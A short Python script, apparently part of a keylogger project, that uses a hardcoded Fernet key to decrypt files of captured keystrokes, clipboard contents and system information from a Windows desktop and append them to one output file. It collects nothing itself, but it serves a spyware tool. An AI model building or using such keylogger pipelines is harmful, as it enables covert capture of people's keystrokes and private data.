from cryptography.fernet import Fernet

key = "s2e5ovvny7y6THH2aTu3yBTtV5NSPMYwcpygo7alpI4=" 
system_information_e = "C:\\Users\\SATENDRA SINGH NEGI\\Desktop\\e_systeminfo.txt"
clipboard_information_e = "C:\\Users\\SATENDRA SINGH NEGI\\Desktop\\e_clipboard.txt"
keys_information_e = "C:\\Users\\SATENDRA SINGH NEGI\\Desktop\\e_key_log.txt"


encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_files in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)
    count += 1
